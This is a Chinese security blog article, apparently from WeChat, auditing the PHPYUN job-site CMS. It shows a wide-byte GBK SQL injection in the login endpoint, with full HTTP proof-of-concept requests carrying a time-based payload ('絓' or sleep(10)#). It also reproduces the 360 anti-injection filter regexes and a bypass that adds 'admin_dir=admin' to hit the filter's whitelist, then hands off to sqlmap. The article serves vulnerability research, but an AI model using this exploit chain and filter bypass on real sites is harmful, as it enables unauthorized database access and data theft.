---
title: 【微信】PHP代码审计-PHPYUN-从字符编码转换到宽字节 SQL 注入
source: https://mp.weixin.qq.com/s/SwZeCaj7cZdqelU3otZ9EA
source_host: mp.weixin.qq.com
clip_date: 2026-11-09T09:02:26+08:00
trace_id: af5eae89-f7e7-41c0-8c0d-02b39100826a
content_hash: 8de55521302c1362e5348041705841c2f4b69de2e356c1cd4c9b9279036dc4c4
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 15
  succeeded: 15
  failed_urls: []
notion_page_id: 41375244-d011-811d-bff8-deb9d23c172a
ioc:
  cves: []
  cwes: []
  hashes:
    - 5d8faa937b9d5a8c58c83d9efa64124c
  domains: []
  tools: []
  techniques: []
---

**风铃Sec** *2026年11月8日 19:48*

书接笔者的上一篇文章：《PHP代码审计-PHPYUN-Bypass防护实现SQL注入》在前文我们实现了绕过了系统的一层防护实现了SQL注入漏洞，但是这个注入更多地还是由于开发人员不知道出于何种原因去除 `\` 导致的，如果这个反斜杠没有被去除，我们还能不能实现注入？答案肯定是可以的，不然也不会有这篇文章了。关于系统环境部署、路由分析、防护绕过的内容，请移步上一篇文章。

#### 漏洞链追踪

访问URL：

```
http://192.168.213.1/phpyun/index.php?m=login&usertype=1
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ada0f32aeea5a8a6.png)

根据路由规则定位到对应代码： `login.class.php` 的 `login_controller` ，并在此下个断点。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/884e763822ef0a17.png)

发送登录数据包，数据包中需要携带safekey，以绕过转实体的操作：

```
POST /phpyun/index.php?m=login&c=loginsave HTTP/1.1
Host: 192.168.213.1
Content-Length: 107
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 EdgA/125.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.213.1
Referer: http://192.168.213.1/phpyun/index.php?m=login&usertype=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=14384; PHPSESSID=v0i0912mlta0lu0l5cg1gp97u4
sec-ch-ua-platform: "Android"
sec-ch-ua: "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
sec-ch-ua-arch: "arm"
sec-ch-ua-bitness: ""
sec-ch-ua-full-version: "125.0.0.0"
sec-ch-ua-full-version-list: "Chromium";v="125.0.0.0", "Google Chrome";v="125.0.0.0"
sec-ch-ua-model: "Android"
sec-ch-ua-platform-version: ""
Connection: keep-alive

username=aaaaa'&password=aaaaaaa&usertype=1&path=index&loginname=0&safekey=5d8faa937b9d5a8c58c83d9efa64124c
```

接着进行动态调试，发现单引号被转义：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3befff77e8dabeb9.png)

但是在用户名被变量接收时，开发者做了如下操作：

```
        $username=iconv("utf-8","gbk",$_POST['username']);
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9c0c5d9ae6832cce.png)

这行代码将用户提交的用户名从 UTF-8 字符编码转换为 GBK 编码。那么此时可以尝试宽字节注入，重新发送如下数据包，并进行动态调试：

```
POST /phpyun/index.php?m=login&c=loginsave HTTP/1.1
Host: 192.168.213.1
Content-Length: 107
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 EdgA/125.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.213.1
Referer: http://192.168.213.1/phpyun/index.php?m=login&usertype=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=14384; PHPSESSID=v0i0912mlta0lu0l5cg1gp97u4
sec-ch-ua-platform: "Android"
sec-ch-ua: "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
sec-ch-ua-arch: "arm"
sec-ch-ua-bitness: ""
sec-ch-ua-full-version: "125.0.0.0"
sec-ch-ua-full-version-list: "Chromium";v="125.0.0.0", "Google Chrome";v="125.0.0.0"
sec-ch-ua-model: "Android"
sec-ch-ua-platform-version: ""
Connection: keep-alive

username=aaaaa%df'&password=aaaaaaa&usertype=1&path=index&loginname=0&safekey=5d8faa937b9d5a8c58c83d9efa64124c
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4ebb22dda9dfc169.png)

重新发送后发现POST列表中的username的反斜杠已经被转义，但是$username变量却是false。这是因为输入的内容中包含了特殊字节序列， `iconv()` **在 UTF-8 转 GBK 时遇到了无法识别或不完整的 UTF-8 字符序列**，因此转换失败并返回 `false` 。本来到程序到这里实际上已经算是安全了，但是奈何开发者还做了一个多余操作操作，这边来看一下对应代码：

在global中追溯mysql类

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/78990b41c82b23ea.png)

发现这个类在连接数据库的时候做了如下操作：

```kotlin
public function connect() {
    if ($this->conn == "pconn") {

        $this->conn = @mysql_pconnect($this->db_host, $this->db_user, $this->db_pwd) or die('数据库连接出错!');
    } else {

        $this->conn = @mysql_connect($this->db_host, $this->db_user, $this->db_pwd) or die('数据库连接出错!');
    }
    if (!@mysql_select_db($this->db_database, $this->conn)) {
        if ($this->show_error) {
            $this->show_error("数据库不可用：", $this->db_database);
        }
    }
    @mysql_query("SET NAMES $this->coding");
    @mysql_query("SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary", $this->conn); 

}
```

通过动态调试可知此时 `$this->coding` 的值是GBK：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8db8926c62ff707c.png)

我们可以关注以下从上述代码中摘下来的重点代码：

```kotlin
@mysql_query("SET NAMES $this->coding");
@mysql_query("SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary", $this->conn);
```

这串代码设置 MySQL 数据库连接过程中的字符集，控制客户端发送的数据、数据库内部处理的数据以及返回结果的编码方式。

```
@mysql_query("SET NAMES gbk");
```

它相当于设置以下三个变量：

```
character_set_client
character_set_connection
character_set_results
```

| 变量  | 作用  |
| --- | --- |
| character_set_client | 告诉 MySQL 客户端发送过来的 SQL 使用什么编码 |
| character_set_connection | MySQL 接收 SQL 后，使用什么编码进行处理 |
| character_set_results | MySQL 返回查询结果时使用什么编码 |

第二行代码分别制定三个字符集：

```
@mysql_query("SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary", $this->conn);
```

| 变量  | 设置值 | 含义  |
| --- | --- | --- |
| character_set_connection | gbk | SQL 处理使用 GBK |
| character_set_results | gbk | 查询结果按照 GBK 返回 |
| character_set_client | binary | 客户端发送的数据按照二进制处理 |

这里的 `binary` 值尤其值得关注，它意味着 MySQL 不按照普通字符集对客户端传入的数据进行常规字符集转换，而是以二进制方式处理。

经典的宽字节注入问题通常涉及：

-   数据库连接使用 GBK 等多字节字符集。
    
-   程序使用 `addslashes()` 或其他方式添加反斜杠。
    
-   输入数据中存在能够与 `0x5C` 组合成合法 GBK 双字节字符的字节。
    
-   数据库解析 SQL 时，将原本的反斜杠解释为双字节字符的一部分。
    

但是，这段代码中 `character_set_client=binary` ，改变了 MySQL 对客户端输入的字符集处理方式。

好的，现在如果想要绕过，就必须搞清楚iconv是如何进行编码变换的，我们重点来研究一下如下代码：

```
iconv("utf-8", "gbk", $_POST['username']);
```

`iconv` 编码转换的转换规则不是简单地替换某个字节，而是按照 UTF-8 编码规则解码字符，再按照 GBK 编码规则重新编码。

先看一个例子：

```bash
$str = "中";
$result = iconv("UTF-8", "GBK", $str);
```

字符「中」在两种编码下的十六进制表示不同：

-   GBK ：D6 D0

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5f7a02deabde8c4c.png)
    

字符没有变化，但是底层字节发生了变化。这个时候因为 `character_set_client=binary` 这个设置，导致说此时客户端传入的字符集是以二进制的形式来处理的。那么我们就可以找到一个GBK编码是以%5c（ `\` ）结尾的字符放在单引号前面用于转义addSlash添加的 `\` ，如絓（%bd%5c）、錦（%e5%5c），下面以錦作为例子：

```
aaaaaa錦'
```

添加上反斜杠后的payload如下：

```
aaaaaa錦\'
```

这个时候经过iconv进行编码转换后，此时上述字符的GBK形式如下：

```
aaaaaa%e5%5c\'
```

因为设置了binary，所以在数据库层会将%e5和%5c看成是单独的字符，所以数据库中最后看到的字符串如下：

```
aaaaaa?\\'
```

可以看到錦（%e5%5c）第二个编码5c在数据库层被看成是反斜杠，从而转义了addSlash添加的 `\` 。从而绕过该防护，最后的PoC如下：

```
POST /phpyun/index.php?m=login&c=loginsave HTTP/1.1
Host: 192.168.213.1
Content-Length: 124
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 EdgA/125.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.213.1
Referer: http://192.168.213.1/phpyun/index.php?m=login&usertype=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=14384; PHPSESSID=v0i0912mlta0lu0l5cg1gp97u4
sec-ch-ua-platform: "Android"
sec-ch-ua: "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
sec-ch-ua-arch: "arm"
sec-ch-ua-bitness: ""
sec-ch-ua-full-version: "125.0.0.0"
sec-ch-ua-full-version-list: "Chromium";v="125.0.0.0", "Google Chrome";v="125.0.0.0"
sec-ch-ua-model: "Android"
sec-ch-ua-platform-version: ""
Connection: keep-alive

username=aaaaa絓' or sleep(10)#&password=aaaaaaa&usertype=1&path=index&loginname=0&safekey=5d8faa937b9d5a8c58c83d9efa64124c
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fd30cb1148a3d936.png)

剩下的就交给SQLMap了，在SQLMap执行的过程中发现自己被ban了：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/668dd39e419c8dea.png)

这是触发360防注入防护，经过动调发现，程序走到这里就出发了该防护。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f756447709fce8a5.png)

我们跟进动调一下，跟进发现对应的拦截规则如下：

```swift
//get拦截规则
$getfilter = "<[^>]*?=[^>]*?&#[^>]*?>|\\b(alert\\(|confirm\\(|expression\\(|prompt\\()|<[^>]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^>]*?>|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.+?\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
//post拦截规则
$postfilter = "<[^>]*?=[^>]*?&#[^>]*?>|\\b(alert\\(|confirm\\(|expression\\(|prompt\\()|<[^>]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b[^>]*?>|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.+?\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
//cookie拦截规则
$cookiefilter = "\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.+?\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";
```

这个是真正起作用的正则，但是正则中没有：

```
sleep()
```

这也是为什么我们刚刚的sleep(10)能够进入dbms中执行，继续执行发现如下代码：

```php
/**
 *  拦截目录白名单
 */
function webscan_white($webscan_white_name,$webscan_white_url=array()) {
  $url_path=$_SERVER['PHP_SELF'];
  $url_var=$_SERVER['QUERY_STRING'];
  if (preg_match("/".$webscan_white_name."/is",$url_path)==1) {
    return false;
  }
  foreach ($webscan_white_url as $key => $value) {
    if(!empty($url_var)&&!empty($value)){
      if (stristr($url_path,$key)&&stristr($url_var,$value)) {
        return false;
      }
    }
    elseif (empty($url_var)&&empty($value)) {
      if (stristr($url_path,$key)) {
        return false;
      }
    }

  }
```

说明次数是可以设置白名单的，接着继续跟发现请求在此处被阻断了：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d7ad66062906288f.png)

```php
if ($webscan_switch&&webscan_white($webscan_white_directory,$webscan_white_url)) {
    
  if ($webscan_get) {

    foreach($_GET as $key=>$value) {
      webscan_StopAttack($key,$value,$getfilter,"GET");
    }
  }
    
   //阻断点
  if ($webscan_post) {
    foreach($_POST as $key=>$value) {
      webscan_StopAttack($key,$value,$postfilter,"POST");
    }
  }
  if ($webscan_cookie) {
    foreach($_COOKIE as $key=>$value) {
      webscan_StopAttack($key,$value,$cookiefilter,"COOKIE");
    }
  }
  if ($webscan_referre) {
    foreach($webscan_referer as $key=>$value) {
      webscan_StopAttack($key,$value,$postfilter,"REFERRER");
    }
  }
}
```

说明此时要阻断该攻击要满足：

```
$webscan_switch&&webscan_white($webscan_white_directory,$webscan_white_url)
```

这两个条件都为true，其中 `$webscan_switch` 值为1。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b9eee7e8eea13633.png)

再来第二个条件有没有可以操作的点：

```
webscan_white($webscan_white_directory,$webscan_white_url)
```

跟进仔细研究一下代码：

```php
function webscan_white($webscan_white_name,$webscan_white_url=array()) {
  $url_path=$_SERVER['PHP_SELF'];   //当前执行的 PHP 脚本路径，当前路径为/index.php
  $url_var=$_SERVER['QUERY_STRING']; 
    //URL 中 ? 后面的查询字符串 当前QUERY_STRING：m=login&c=index
    
  if (preg_match("/".$webscan_white_name."/is",$url_path)==1) {
    return false;
  }
    
  foreach ($webscan_white_url as $key => $value) {
    if(!empty($url_var)&&!empty($value)){
      if (stristr($url_path,$key)&&stristr($url_var,$value)) {
        return false;
      }
    }
    elseif (empty($url_var)&&empty($value)) {
      if (stristr($url_path,$key)) {
        return false;
      }
    }

  }

  return true;
}
```

进入这个函数后发现此处已经设置了 `$webscan_white_url` 两个白名单：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/13a8959730563665.png)

带入上述代码

```php
foreach ($webscan_white_url as $key => $value) {  
    //key是要匹配的 PHP 路径，//要匹配的 URL 查询字符串。
   if(!empty($url_var)&&!empty($value)){
     if (stristr($url_path,$key)&&stristr($url_var,$value)) {
       return false;
     }
   }
```

当URL路径包含 `$key` ，URL 查询字符串包含 `$value` ，时就返回false，从而不进行检测。

此时$key的取值

```
index.php 和 post.php
```

$value的值：

```
admin_dir=admin 和 job=postnew&step=post
```

到这边情况就很明朗了，我们原本的请求路径就已经有包含index.php，现在要做的就是添加参数：

```
admin_dir=admin
```

就可以直接绕过这个检测了，最终数据包如下：

```
POST /phpyun/index.php?m=login&c=loginsave&admin_dir=admin HTTP/1.1
Host: 192.168.213.1
Content-Length: 110
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 EdgA/125.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.213.1
Referer: http://192.168.213.1/phpyun/index.php?m=login&usertype=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=17152; PHPSESSID=v0i0912mlta0lu0l5cg1gp97u4
sec-ch-ua-platform: "Android"
sec-ch-ua: "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
sec-ch-ua-arch: "arm"
sec-ch-ua-bitness: ""
sec-ch-ua-full-version: "125.0.0.0"
sec-ch-ua-full-version-list: "Chromium";v="125.0.0.0", "Google Chrome";v="125.0.0.0"
sec-ch-ua-model: "Android"
sec-ch-ua-platform-version: ""
Connection: keep-alive

username=aaaaa絓' or sleep(10)#&password=aaaaaaa&usertype=1&path=index&loginname=0&safekey=5d8faa937b9d5a8c58c83d9efa64124c
```

SQLmap结果：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1b8ff5a666cfba37.png)

PHP代码审计 · 目录
